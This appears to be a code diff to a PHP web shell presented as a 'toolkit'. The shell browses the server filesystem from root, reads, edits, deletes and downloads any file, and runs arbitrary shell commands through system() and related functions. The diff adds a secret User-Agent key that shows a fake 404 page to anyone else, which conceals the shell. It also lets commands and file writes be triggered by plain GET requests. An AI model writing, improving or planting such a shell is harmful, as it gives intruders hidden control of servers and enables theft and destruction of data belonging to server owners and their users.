@@ -2,6 +2,15 @@
 // All-in-one toolkit - based on working filesystem browser
 // Added: delete, zip download, command exec, file edit
 
+// --- UA GATE ---
+// Set your browser User-Agent to include this string, or: curl -A "TK-AGENT" <url>
+$UA_KEY = 'TK-AGENT';
+if (strpos($_SERVER['HTTP_USER_AGENT'] ?? '', $UA_KEY) === false) {
+    http_response_code(404);
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
+    exit;
+}
+
 $root = '/';
 $path = isset($_GET['p']) ? $_GET['p'] : $root;
 $action = isset($_GET['a']) ? $_GET['a'] : 'browse';
@@ -42,11 +51,11 @@ if ($action === 'dlfile' && $dl) {
     exit;
 }
 
-// Save file (edit)
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a']) && $_POST['a'] === 'save') {
+// Save file (edit) - supports both GET and POST
+if (isset($_REQUEST['a']) && $_REQUEST['a'] === 'save' && isset($_REQUEST['f'])) {
     header('Content-Type: application/json');
-    $f = isset($_POST['f']) ? str_replace("\0", '', $_POST['f']) : '';
-    $content = isset($_POST['content']) ? $_POST['content'] : '';
+    $f = str_replace("\0", '', $_REQUEST['f']);
+    $content = isset($_REQUEST['content']) ? $_REQUEST['content'] : '';
     if ($f === '' || !@is_file($f)) {
         echo json_encode(['ok' => false, 'error' => 'Invalid file path']);
     } elseif (@file_put_contents($f, $content) !== false) {
@@ -119,12 +128,12 @@ if ($action === 'del' && isset($_GET['f'])) {
     }
 }
 
-// Command exec (POST)
+// Command exec - supports both GET and POST
 $cmd_output = '';
 $cmd_method = '';
 $cmd_input = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
-    $cmd_input = $_POST['cmd'];
+if (isset($_REQUEST['cmd'])) {
+    $cmd_input = $_REQUEST['cmd'];
     $cmd = $cmd_input;
     if (function_exists('system')) {
         ob_start(); @system($cmd . ' 2>&1'); $cmd_output = ob_get_clean(); $cmd_method = 'system()';
@@ -146,7 +155,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
         }
     }
     if ($cmd_method === '') { $cmd_output = 'No exec function available'; $cmd_method = 'NONE'; }
-    $path = isset($_POST['p']) ? $_POST['p'] : $path;
+    $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : $path;
 }
 
 $exec_funcs = ['system','exec','shell_exec','passthru','popen','proc_open'];
@@ -438,7 +447,8 @@ function startEdit() {
   content.style.display = 'none';
   editor.style.display = 'block';
   document.getElementById('btn-edit').style.display = 'none';
-  document.getElementById('btn-save').style.display = '';
+  document.getElementById('btn-save-post').style.display = '';
+  document.getElementById('btn-save-get').style.display = '';
   document.getElementById('btn-cancel').style.display = '';
   editor.focus();
 }
@@ -449,45 +459,45 @@ function cancelEdit() {
   content.style.display = '';
   editor.style.display = 'none';
   document.getElementById('btn-edit').style.display = '';
-  document.getElementById('btn-save').style.display = 'none';
+  document.getElementById('btn-save-post').style.display = 'none';
+  document.getElementById('btn-save-get').style.display = 'none';
   document.getElementById('btn-cancel').style.display = 'none';
 }
 
-function saveFile() {
+function saveFile(method) {
   var editor = document.getElementById('viewer-editor');
-  var btn = document.getElementById('btn-save');
+  var btn = method === 'POST' ? document.getElementById('btn-save-post') : document.getElementById('btn-save-get');
   btn.textContent = 'SAVING...';
   btn.disabled = true;
-
-  var data = new FormData();
-  data.append('a', 'save');
-  data.append('f', currentFilePath);
-  data.append('content', editor.value);
-
   var xhr = new XMLHttpRequest();
-  xhr.open('POST', window.location.pathname, true);
+  var data = null;
+  if (method === 'POST') {
+    data = new FormData();
+    data.append('a', 'save');
+    data.append('f', currentFilePath);
+    data.append('content', editor.value);
+    xhr.open('POST', window.location.pathname, true);
+  } else {
+    xhr.open('GET', window.location.pathname + '?a=save&f=' + encodeURIComponent(currentFilePath) + '&content=' + encodeURIComponent(editor.value), true);
+  }
   xhr.onload = function() {
     try {
       var res = JSON.parse(xhr.responseText);
       if (res.ok) {
         document.getElementById('viewer-content').textContent = editor.value;
         cancelEdit();
-        btn.textContent = 'SAVE';
-        btn.disabled = false;
       } else {
         alert('Save failed: ' + (res.error || 'unknown error'));
-        btn.textContent = 'SAVE';
-        btn.disabled = false;
       }
     } catch(e) {
       alert('Save failed: bad response');
-      btn.textContent = 'SAVE';
-      btn.disabled = false;
     }
+    btn.textContent = method === 'POST' ? 'SAVE POST' : 'SAVE GET';
+    btn.disabled = false;
   };
   xhr.onerror = function() {
     alert('Save failed: network error');
-    btn.textContent = 'SAVE';
+    btn.textContent = method === 'POST' ? 'SAVE POST' : 'SAVE GET';
     btn.disabled = false;
   };
   xhr.send(data);
@@ -530,10 +540,11 @@ function saveFile() {
   <!-- CMD -->
   <div class="panel">
     <div class="panel-header">CMD <span class="count"><?= $cmd_method ?: '---' ?></span></div>
-    <form method="post" class="cmd-row">
+    <form id="cmdForm" method="post" class="cmd-row">
       <input type="hidden" name="p" value="<?= htmlspecialchars($path) ?>">
       <input type="text" name="cmd" class="cmd-input" value="<?= htmlspecialchars($cmd_input) ?>" placeholder="command..." id="cmdInput" autocomplete="off">
-      <button type="submit" class="btn">RUN</button>
+      <button type="submit" class="btn">POST</button>
+      <button type="submit" class="btn btn-blue" onclick="document.getElementById('cmdForm').method='get'">GET</button>
     </form>
     <div class="cmd-funcs">
       <?php foreach ($exec_funcs as $fn): ?>
@@ -624,7 +635,8 @@ function saveFile() {
     <div class="viewer-actions">
       <a href="#" id="viewer-dl" class="btn btn-sm btn-blue">download</a>
       <button id="btn-edit" class="btn btn-sm btn-warn" onclick="startEdit()">EDIT</button>
-      <button id="btn-save" class="btn btn-sm" onclick="saveFile()" style="display:none">SAVE</button>
+      <button id="btn-save-post" class="btn btn-sm" onclick="saveFile('POST')" style="display:none">SAVE POST</button>
+      <button id="btn-save-get" class="btn btn-sm btn-blue" onclick="saveFile('GET')" style="display:none">SAVE GET</button>
       <button id="btn-cancel" class="btn btn-sm btn-red" onclick="cancelEdit()" style="display:none">CANCEL</button>
       <button class="viewer-close" onclick="closeViewer()">CLOSE</button>
     </div>
